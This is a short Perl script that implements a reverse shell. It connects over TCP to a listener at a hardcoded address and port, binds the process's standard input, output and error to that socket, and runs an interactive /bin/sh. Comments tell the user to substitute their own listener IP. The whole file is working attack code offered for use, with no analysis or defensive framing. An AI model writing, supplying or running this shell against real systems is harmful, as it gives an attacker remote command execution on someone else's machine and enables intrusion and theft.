#!/usr/bin/perl


use strict;
use warnings;
use IO::Socket;

# Change these to your listener's IP and port
my $ip = '10.10.14.5';  # Replace with your IP
my $port = 7777;           # Replace with your port

# Create a socket connection
my $socket = IO::Socket::INET->new(
    PeerAddr => $ip,
    PeerPort => $port,
    Proto    => 'tcp'
) or die "Could not connect to $ip:$port: $!";

# Redirect STDIN, STDOUT, and STDERR to the socket
open(STDIN, '<', $socket) or die "Can't redirect STDIN: $!";
open(STDOUT, '>', $socket) or die "Can't redirect STDOUT: $!";
open(STDERR, '>', $socket) or die "Can't redirect STDERR: $!";

# Execute a shell
exec('/bin/sh -i');
